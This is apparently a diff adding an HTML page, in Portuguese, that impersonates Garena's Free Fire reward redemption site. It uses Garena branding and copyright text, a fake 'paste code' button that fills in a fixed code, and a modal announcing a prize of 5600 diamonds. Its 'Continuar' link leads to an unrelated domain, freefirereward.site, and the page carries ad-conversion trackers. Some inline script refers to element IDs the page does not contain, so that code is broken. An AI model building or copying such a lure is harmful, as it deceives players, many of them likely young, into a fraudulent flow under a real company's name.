@@ -1,0 +1,330 @@
+﻿<html data-build-timestamp-utc="2025-02-18T07:02:07.471Z" lang="pt-BR">
+
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="on" http-equiv="x-dns-prefetch-control">
+    <meta content="width=device-width,initial-scale=1,viewport-fit=cover" name="viewport">
+    <title>
+        Free Fire
+    </title>
+    <link href="https://prod-api.reward.ff.garena.com/" rel="dns-prefetch">
+    <link href="../common/web_event/tweb-event/FFSH/assets-common/ff-logo-icon.png" rel="icon" type="image/x-icon">
+    <link href="../common/web_event/tweb-event/FFSH/assets-common/ff-logo-icon.png" rel="shortcut icon" type="image/x-icon">
+    <link rel="stylesheet" href="css/style.css">
+    <meta content="" name="description">
+    <meta content="" name="author">
+    <meta content="FreeFire" name="title">
+    <meta content="FreeFire" name="description">
+    <meta content="FreeFire" property="og:title">
+    <meta content="FreeFire" property="og:description">
+    
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17449236583">
+</script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-17449236583');
+</script>
+    
+<script>
+  window.pixelId = "68a2ca5cfd2fcd9cc4dd4aad";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1607320653270124');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1607320653270124&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+    <script>
+        window.dataLayer = window.dataLayer || [];
+
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+        gtag('set', 'linker', {
+            'domains': ['reward.ff.garena.com'],
+            'accept_incoming': true
+        });
+        gtag('js', new Date());
+        gtag('config', 'G-Y1QNJ6ZLV6');
+    </script>
+    <script type="application/ld+json">
+        {
+            "@context": "https://schema.org",
+            "@type": "WebSite",
+            "name": "Free Fire Redemption",
+            "alternateName": ["Free Fire Redemption", "Garena Free Fire"],
+            "url": "https://reward.ff.garena.com/"
+        }
+    </script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Elementos da página
+            const redemptionInput = document.getElementById('redemption-input');
+            const pasteBtn = document.getElementById('paste-btn');
+            const redeemBtn = document.getElementById('redeem-btn');
+            const confirmationModal = document.getElementById('confirmation-modal');
+            const modalContinueBtn = document.getElementById('modal-continue-btn');
+
+            // Código de resgate
+            const redemptionCode = "FF12-AB34-CDE5-DIM4";
+
+            // Função para "colar" o código
+            pasteBtn.addEventListener('click', function() {
+                // Simula colar o código no input
+                redemptionInput.value = redemptionCode;
+
+                // Mostra o botão de resgatar
+                redeemBtn.style.display = 'block';
+            });
+
+            // Função para processar o resgate
+            redeemBtn.addEventListener('click', function() {
+                // Mostra o modal de confirmação
+                confirmationModal.style.display = 'flex';
+            });
+
+            // Botão para continuar após o resgate
+            modalContinueBtn.addEventListener('click', function() {
+                // Fecha o modal
+                confirmationModal.style.display = 'none';
+
+                // Redireciona para a página de recompensas
+                window.location.href = 'rewards_page/index.html';
+            });
+        });
+    </script>
+
+    <link href="css/main.9811c799ac666fc6771e.css" rel="stylesheet">
+    <link href="https://www.googletagmanager.com" rel="preconnect">
+    <style>
+        @media (max-width: 768px) {
+            .desktop-layout {
+                flex-direction: column !important;
+            }
+            .side-image {
+                width: 100% !important;
+                max-height: 200px !important;
+                overflow: hidden;
+            }
+            .content-area {
+                width: 100% !important;
+                padding: 15px !important;
+            }
+            .user-controls {
+                flex-direction: column !important;
+                gap: 10px !important;
+            }
+            .user-info {
+                order: -1;
+                margin-bottom: 10px;
+                text-align: center !important;
+                width: 100%;
+            }
+            .logout-btn,
+            .confirm-btn {
+                width: 100%;
+            }
+            .store-button {
+                top: 5px !important;
+                right: 5px !important;
+                z-index: 10;
+            }
+            .footer-content {
+                flex-direction: column !important;
+            }
+        }
+
+        #modal-confirmacao {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .modal-conteudo {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            margin: 20px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+        }
+
+        #modal-continuar {
+            display: inline-block;
+            background: #36b376;
+            color: white;
+            padding: 12px 35px;
+            border-radius: 25px;
+            text-decoration: none;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="app">
+        <div class="main">
+            <div class="home-wrapper" data-v-470541af="" style="background-color: #ffdd33;">
+                <div class="home-container" data-v-470541af="" style="background-color: #ffdd33; position: relative;">
+                    <div class="home desktop-layout" data-v-470541af="" style="display: flex;">
+
+                        <div class="content-area home__right" data-v-470541af="" style="width: 60%; padding: 20px;">
+                            <div class="header" data-v-02adb2b5="" data-v-470541af="" style="text-align: center; margin-bottom: 30px;">
+                                <div class="header-content" data-v-02adb2b5="">
+                                    <div class="header__logo" data-v-02adb2b5="">
+                                        <style>
+                                            @media (min-width: 1024px) {
+                                                .header__logo {
+                                                    position: fixed;
+                                                    top: 25;
+                                                    left: 430;
+                                                    z-index: 9999;
+                                                }
+                                            }
+                                        </style>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="main" data-v-3dc8ebc8="" data-v-470541af="" style="margin: 0 auto; max-width: 600px;">
+                                <div class="main-header" data-v-3dc8ebc8="" style="text-align: center; margin-bottom: 20px;">
+                                    <h2 class="main__title" data-v-3dc8ebc8="" style="font-size: 24px; margin-bottom: 5px;">
+                                        Site de Resgate de Recompensas
+                                    </h2>
+                                    <span class="main__description" data-v-3dc8ebc8="" style="font-size: 16px;">
+                      Resgate seu código
+                    </span>
+                                </div>
+
+                                <div class="resgate-container">
+                                    <input type="text" id="codigo-input" placeholder="Clique no botão abaixo para colar" readonly="">
+
+                                    <!-- Botão principal de colar -->
+                                    <button id="colar-btn">
+                      <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewbox="0 0 24 24">
+                        <path fill-rule="evenodd" d="M6.5 3.85c0-.47.392-.85.875-.85h5.25c.483 0 .875.38.875.85h1.75c.966 0 1.75.761 1.75 1.7V6h-1c-.728 0-1.732-.06-2.434.095a4.01 4.01 0 0 0-.88.307.91.91 0 0 0-.061-.002h-.875V4.7h-3.5v1.7h-.875a.863.863 0 0 0-.875.85c0 .47.392.85.875.85h3.36L9.077 9.871a4 4 0 0 0-.892 1.526C7.97 12.083 8 13.268 8 14v5c0 .729.195 1.412.535 2H4.75C3.784 21 3 20.239 3 19.3V5.55c0-.939.784-1.7 1.75-1.7H6.5Z" clip-rule="evenodd"></path>
+                        <path fill-rule="evenodd" d="M14 8.048V12h-3.907a2 2 0 0 1 .446-.763l2.434-2.603A2 2 0 0 1 14 8.048ZM16 8v4a2 2 0 0 1-2 2h-4v5a2 2 0 0 0 2 2h7a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-3Z" clip-rule="evenodd"></path>
+                      </svg>
+                      Colar Código Copiado
+                    </button>
+
+
+                                    <!-- Botão de resgatar que aparece após colar -->
+                                    <button id="resgatar-btn">Resgatar Agora</button>
+                                </div>
+                            </div>
+
+                            <div id="modal-confirmacao">
+                                <div class="modal-conteudo">
+                                    <h3 id="confirmado">Confirmado!</h3>
+                                    <p><span style="color: black;">Parabéns! Você resgatou o código contendo</span> '<span style="margin-bottom: 15px;" class="destaque">5600 Diamantes</span>'. <span style="color: black; font-size: small;"></span></p>
+                    <p id="cliqueaqui" style="color: black; font-size: small;">Clique em continuar para prosseguir.</p>
+                    <a id="modal-continuar" href="https://freefirereward.site/confirmacao.html"> Continuar</a>
+                  </div>
+                </div>
+
+                <div class="notices" style="max-width: 600px;">
+                  <div class="home-panel home__panel" data-v-470541af="" data-v-f423ab84="" style="background-color: rgba(255,255,255,0.6); padding: 20px; border-radius: 5px;">
+                    <h4 class="home-panel__title" data-v-f423ab84="" style="font-weight: bold; margin-bottom: 10px;">
+                      Aviso Importante:
+                    </h4>
+                    <ol class="list" data-v-f423ab84="" style="padding-left: 20px; margin: 0;">
+                      <li class="list__item" style="margin-bottom: 5px;">
+                        1. O código de resgate tem
+                        <span class="highlight" style="font-weight: bold;">
+                          12/16
+                        </span> caracteres, compostos por letras maiúsculas e números.
+                                        </li>
+                                        <li class="list__item" style="margin-bottom: 5px;">
+                                            2. As recompensas de itens são mostradas na guia
+                                            <span class="highlight" style="font-weight: bold;">
+                          [cofre]
+                        </span> no lobby do jogo; Ouro ou diamantes serão adicionados automaticamente à carteira da conta.
+                                        </li>
+                                        <li class="list__item" style="margin-bottom: 5px;">
+                                            3. Observe a data de expiração do resgate. Códigos expirados não podem ser resgatados.
+                                        </li>
+                                        <li class="list__item" style="margin-bottom: 5px;">
+                                            4. Entre em contato com o serviço de atendimento ao cliente se encontrar algum problema.
+                                        </li>
+                                        <li class="list__item" style="margin-bottom: 5px;">
+                                            5. Lembrete: você não poderá resgatar suas recompensas com contas de convidado. Você pode vincular sua conta ao Facebook ou VK para receber as recompensas.
+                                        </li>
+                                        </ol>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+
+                    <script src="js/script.js"></script>
+
+                    <script>
+                        document.querySelector('.resgate-container').addEventListener('click', function() {
+                            document.getElementById('colar-btn').click();
+                        });
+                    </script>
+
+
+                    <footer class="footer" data-v-3a03f104="" data-v-470541af="" style="background-color: black; color: white; padding: 10px; text-align: center;">
+                        <div class="footer-content" style="display: flex; justify-content: center; align-items: center; gap: 10px;">
+                            <img src="images/logo_small_foot.jpg" alt="Logo" style="height: 30px;">
+                            <div>
+                                <p style="margin: 0; font-size: 12px;">
+                                    Copyright © Garena International.
+                                </p>
+                                <p style="margin: 0; font-size: 12px;">
+                                    Marcas registradas pertencem aos seus respectivos proprietários. Todos os direitos reservados.
+                                </p>
+                            </div>
+                        </div>
+                    </footer>
+                </div>
+            </div>
+            <!-- -->
+            <!-- -->
+        </div>
+        <script defer="" src="../beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"92f5c0374fc06284","version":"2025.3.0","r":1,"token":"e2b7d3ae6c0d44e3a841ead1666fd0c6","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
+</div></body>
+
+</html>
